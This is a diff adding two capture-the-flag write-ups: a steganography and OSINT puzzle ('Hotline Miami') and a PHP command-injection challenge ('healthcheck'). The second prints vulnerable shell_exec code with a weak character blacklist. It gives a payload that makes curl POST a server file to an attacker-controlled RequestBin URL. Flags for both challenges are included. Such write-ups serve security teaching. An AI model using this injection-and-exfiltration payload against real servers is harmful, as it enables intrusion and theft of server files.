@@ -104,3 +104,135 @@ Opened fixed MP4 in a video editor, found a visible frame in the video displayin
 ![](./image/Picture18.png)
 
 Flag: `umcs{h1dd3n_1n_fr4m3}`
+
+## Hotline Miami
+
+![](./image/Picture19.png)
+
+### Executive Summary
+
+This challenge required investigating three files (JPG, TXT, and WAV) to discover hidden information through steganographic techniques.
+
+### Challenge Overview
+
+The challenge provided three main files: rooster.jpg, readme.txt, and iamthekidyouknowwhatimean.wav. To solve it, we needed to analyze each file and connect the clues, requiring some out-of-the-box thinking. The flag format was provided in the readme.txt file.
+
+### Tools used
+
+• Sonic Visualiser
+• Notepad
+• Google
+
+### Analysis & Flag Extraction
+
+1. First we start the analysis by using the sonic visualiser to view the spectrogram of the (iamthekidyouknowhwhatimean.wav) file.
+
+2. We can see clearly there is a word of _Watching 1989_ on the spectrogram view.
+
+![](./image/Picture20.png)
+
+3. Next let see on the text file. we can see there is **_DO YOU LIKE HURTING OTHER PEOPLE?_** **_Subject_Be_Verb_Year_** and we think the Subject_Be_Verb_Year is the format for the flags.
+
+![](./image/Picture21.png)
+
+4. Search online for the jpg we can found that there is a name for this rooster call Richard.
+
+![](./image/Picture22.png)
+
+5. Lastly we try to search online what is Hotline Miami. It show that it is a game in Steam.
+
+![](./image/Picture23.png)
+
+6. Going search for the games wiki, we can found that there is story of it.
+
+7. Ctrl + f search the clue given "DO YOU LIKE HURTING OTHER PEOPLE?" and we can found that it is a dialogue from Richard.
+
+![](./image/Picture24.png)
+
+8. And yes we double check it and we knew the subject must be Richard, verb is Watching, Year is 1989.
+
+Flag : `umcs{richard_be_watching_1989}`
+
+# healthcheck
+
+![](./image/Picture25.png)
+
+### Executive Summary
+
+This website lets you use the curl command after filtering input with a basic blacklist. The input is passed to shell_exec, making it possible to bypass the filter and inject commands. The goal is to exploit this for code execution.
+
+### Tools used
+
+• BurpSuite
+• RequestBin
+
+### Source Code Analysis
+
+Based on the source code, the interesting part is on top:
+
+```php
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["url"])) {
+    $url = $_POST["url"];
+
+    $blacklist = [PHP_EOL,'$',';','&','#','`','|','*','?','~','<','>','^','<','>','(', ')', '[', ']', '{', '}', '\\'];
+
+    $sanitized_url = str_replace($blacklist, '', $url);
+
+    $command = "curl -s -D - -o /dev/null " . $sanitized_url . " | grep -oP '^HTTP.+[0-9]{3}'";
+
+    $output = shell_exec($command);
+    if ($output) {
+        $response_message .= "<p><strong>Response Code:</strong> " . htmlspecialchars($output) . "</p>";
+    }
+}
+?>
+```
+
+We found out that $blacklist, this need to be avoided.
+
+```
+$blacklist = [PHP_EOL,'$',';','&','#','`','|','*','?','~','<','>','^','<','>','(', ')', '[', ']', '{', '}', '\\'];
+```
+
+### Exploitation
+
+1. First, we noticed that our **_user input_** is passed into the curl command after being sanitized using a basic blacklist.
+   Nice! That means we can try **_command injection_** here.
+
+2. Since they're using **_curl_**, we can log HTTP requests by pointing the command to a custom endpoint. For that, we use a **_RequestBin_** to track the website’s outgoing requests.
+
+3. We’re also given a hint: the keyword **_hopes_and_dreams_**
+   – sounds like something important will be sent to our listener
+
+4. So, we set up a listener and craft a payload to trigger the request.
+
+Note: here we use [RequestBin](https://requestbin.kanbanbox.com/) for this, but webhook.site can also be used, or any custom HTTP logger are applicable.
+
+![](./image/Picture26.png)
+
+### Final Payload
+
+```bash
+https://requestbin.kanbanbox.com/XXXXXX -o /dev/null -X POST --data-binary @hopes_and_dreams
+```
+
+https://requestbin.kanbanbox.com/XXXXXX  
+• This is the **_destination URL_**: RequestBin listener that logs incoming HTTP requests.
+
+-o /dev/null
+• Tells **_curl_** to **_discard the response body_**. We don't care what the server sends back.
+
+-X POST
+• Forces the method to **_POST_**, which is important for sending data.
+
+**_--data-binary @hopes_and_dreams_**
+• This uploads a local file named **_hopes_and_dreams_** from the server.  
+• The @ tells curl to read the **_contents of the file_** and send it as the request body.
+
+### Flag Extraction
+
+After we've done submitting the **_$payload_**, we can just get our flag on the **_RequestBin_**.
+![](./image/Picture27.png)
+
+Flag: `umcs{n1c3_j0b_ste411ng_myh0p3_4nd_dr3ams}`
